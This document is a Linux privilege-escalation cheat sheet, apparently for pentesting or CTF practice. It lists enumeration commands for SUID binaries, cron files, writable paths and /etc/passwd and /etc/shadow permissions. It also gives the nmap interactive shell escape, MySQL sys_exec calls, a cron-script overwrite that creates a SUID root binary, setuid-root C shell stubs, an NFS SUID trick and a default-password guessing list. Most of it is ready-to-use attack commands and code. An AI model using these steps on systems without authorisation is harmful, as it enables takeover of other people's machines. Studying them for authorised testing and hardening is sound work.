# Linux Scripts for Priv escalation :

## 1. Kernel exploits
Requirements : file transfers tools like FTP, TFTP, SCP, wget, and curl

The infamous DirtyCow exploit – Linux Kernel <= 3.19.0-73.8

## 2. Exploiting services which are running as root

Check if web servers, mail servers, database servers, etc. are running as root.

netstat -antup : It shows you all the ports which are open and are listening

ps -aux | grep root – It shows us the services which are running as root.

Eg : EternalBlue and SambaCry exploit , Exploiting a vulnerable version of MySQL which is running as root

Processes running as root that don't have any business doing that. Mysql is a big offender here; if it's running as root you probably want to have a go at it
Try to login and issue below command for SQL 
select sys_exec('whoami');
select sys_eval('whoami');
or raptor SQL method  http://dillidba.blogspot.com/2016/01/get-root-shell-access-using-mysql-with.html

## 3. Exploiting SUID Executables and any root owned file that can be written

find / -user root -perm -4000 -print 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \;

find / -perm -222 -type d 2>/dev/null ( World writable files)
find . -writable ( writable by the user )

SUID bit on any file editor/compiler/interpreter

FOR nmap :
Eg : if namp has SUID set

$ nmap –interactive – runs nmap interactive mode
$ nmap !sh – Lets you escape to the system shell from nmap shell
nmap -v   to check version
nmap 2.02 to 5.21 are vulnerable

Known Linux executables that can allow privilege escalation are:

Nmap
Vim,Vi
find
Bash
More
Less
Nano
cp
awk
docker
file viewer
mv
ftp / sftp
git
mount
rsync
scripting languages - lua,python,perl,ruby
tar
tcpdump
wget
zip

## 4. Exploiting SUDO rights/user  : 

https://pure.security/how-i-got-root-with-sudo/

sudo -l – Prints the commands which we are allowed to run as SUDO

## 5. Exploiting badly configured cron jobs

$ find / -perm -2 -type f 2>/dev/null – prints world writable files

crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

Eg Cronjobs for privelege escalation:

int main(void)
{
setgid(0);
setuid(0);
execl("/bin/sh","sh",0);
}

echo “chown root:root /tmp/rootme; chmod u+s /tmp/rootme;”>/usr/local/sbin/cron-logrotate.sh

./rootme


## 6. Exploiting users with ‘.’ in their PATH : https://hackmag.com/security/reach-the-root/

check using echo $PATH

With ‘.’ in path – program
Without ‘.’ in path – ./program

$ PATH=.:${PATH} – adds ‘.’ in the PATH variable


## 7. Some unusual custom SW which not part of linux distros official package

## 8. If your "netstat -antp" shows listening services that only accept 127.0.0.1 or are otherwise filtered by iptables, immediately tunnel them out via SSH and poke at them from your kali box. Also, try netstat -anlp, netstat -ano

## 9. Known bad packages with SUID executables. While reading through the list of SUID binaries, it's worth looking at their package version. Exim is a good example of this.

## 10. Strangeness in the common "sensitive" files. Know the permissions of /etc/passwd, /etc/shadow, /etc/cron* , as well as the common service config files

## 11. Always worth taking a very close look at everything you find on your user's home directory. If you find config files, scripts, binaries, text files

## 12. Weak/reused/plaintext passwords

    Check file where webserver connect to database (config.php or similar)
    Check databases for admin passwords that might be reused
    Check weak passwords

username:username
username:username1
username:root
username:admin
username:qwerty
username:password

## 13. NFS Share : 

If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured.

 First check if the target machine has any NFS shares
showmount -e 192.168.1.101

 If it does, then mount it to you filesystem
mount 192.168.1.101:/ /tmp/

If that succeeds then you can go to /tmp/share. 

If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file. Then you can create a file and set it with suid-permission from your attacking machine and execute it with your low privilege shell.

This code can be compiled and added to the share. Set SUID: chmod 4777 exploit

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid(0);
    system("/bin/bash");
    return 0;
}
